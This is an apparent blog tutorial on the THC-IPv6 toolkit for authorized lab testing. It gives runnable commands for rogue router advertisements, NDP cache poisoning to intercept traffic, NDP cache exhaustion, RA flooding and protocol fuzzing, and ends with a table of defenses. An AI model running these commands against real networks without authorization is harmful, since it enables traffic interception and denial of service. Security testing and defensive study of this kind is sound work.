# How to Use THC-IPv6 Toolkit for Security Testing

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: THC-IPv6, IPv6, Security Testing, Network Tools, Reconnaissance, Fuzzing

Description: A guide to using the THC-IPv6 toolkit for IPv6 security assessment, including host discovery, NDP attacks, and protocol fuzzing in authorized lab environments.

The THC-IPv6 toolkit (The Hacker's Choice IPv6 Attack Toolkit) is one of the earliest and most comprehensive IPv6 security testing toolkits. It includes over 20 tools for host discovery, NDP manipulation, Router Advertisement attacks, and IPv6 protocol fuzzing. Use only in authorized environments.

**Warning**: All tools in this guide must only be used in authorized lab environments.

## Installing THC-IPv6

```bash
# Debian/Ubuntu
sudo apt-get install thc-ipv6

# From source
git clone https://github.com/vanhauser-thc/thc-ipv6.git
cd thc-ipv6
make
sudo make install
```

## Key THC-IPv6 Tools

| Tool | Purpose |
|---|---|
| alive6 | Discover live IPv6 hosts |
| thcping6 | IPv6 ping with options |
| flood_router6 | RA flood attack |
| flood_advertise6 | NA flood attack |
| fake_router6 | Rogue Router Advertisement |
| fake_mldrouter6 | Fake MLD router |
| ndpexhaust6 | Exhaust NDP cache |
| parasite6 | NDP cache poisoning |
| redir6 | Redirect attack |
| detect-new-ip6 | Monitor for new IPv6 addresses |
| implementation6 | Implementation testing/fuzzing |

## Host Discovery with alive6

```bash
# Discover live hosts on the local link
sudo alive6 eth0

# Discover hosts in a specific prefix
sudo alive6 eth0 2001:db8::/64

# Use multiple probe types
sudo alive6 -i eth0 2001:db8::/64
```

## Rogue Router Advertisement with fake_router6

```bash
# Announce a fake default router
sudo fake_router6 eth0 2001:db8:attacker::/64

# Announce with specific router lifetime
sudo fake_router6 eth0 2001:db8:attacker::/64 200

# Announce with no prefix (just default route)
sudo fake_router6 eth0 ::/0
```

## NDP Cache Poisoning with parasite6

```bash
# Poison NDP cache to become MITM for all hosts
sudo parasite6 eth0

# Poison NDP cache for specific target
sudo parasite6 eth0 2001:db8::target

# Enable IP forwarding before using parasite6 (MITM mode)
sudo sysctl -w net.ipv6.conf.eth0.forwarding=1
sudo parasite6 eth0
```

## NDP Cache Exhaustion with ndpexhaust6

IPv6 routers maintain NDP caches. Exhausting the cache causes denial of service:

```bash
# Flood the router's NDP cache
sudo ndpexhaust6 eth0 2001:db8::router

# Use fast mode
sudo ndpexhaust6 -f eth0 2001:db8::router
```

## Router Advertisement Flooding with flood_router6

```bash
# Flood with router advertisements (disrupt IPv6 default routes)
sudo flood_router6 eth0

# Set flood rate
sudo flood_router6 -i eth0
```

## Protocol Fuzzing with implementation6

```bash
# Fuzz IPv6 implementation of target host
sudo implementation6 eth0 2001:db8::target

# Test specific extension header parsing
sudo implementation6 -p HOP eth0 2001:db8::target

# Full fuzzing suite
sudo implementation6 -a eth0 2001:db8::target
```

## Monitoring for New IPv6 Addresses

```bash
# Alert when new IPv6 addresses appear on segment
sudo detect-new-ip6 eth0

# Log new addresses to file
sudo detect-new-ip6 eth0 | tee new-ipv6-addresses.log
```

## Defenses Against THC-IPv6 Attacks

| Attack | Defense |
|---|---|
| fake_router6 | RA Guard on switches |
| parasite6 | NDPMon, SEND |
| ndpexhaust6 | NDP cache limits on routers |
| flood_router6 | RA rate limiting |
| implementation6 | Patch OS to latest version |

The THC-IPv6 toolkit provides a broad set of attack primitives that help identify IPv6 implementation weaknesses before real attackers do, making it a valuable part of any authorized IPv6 security assessment.
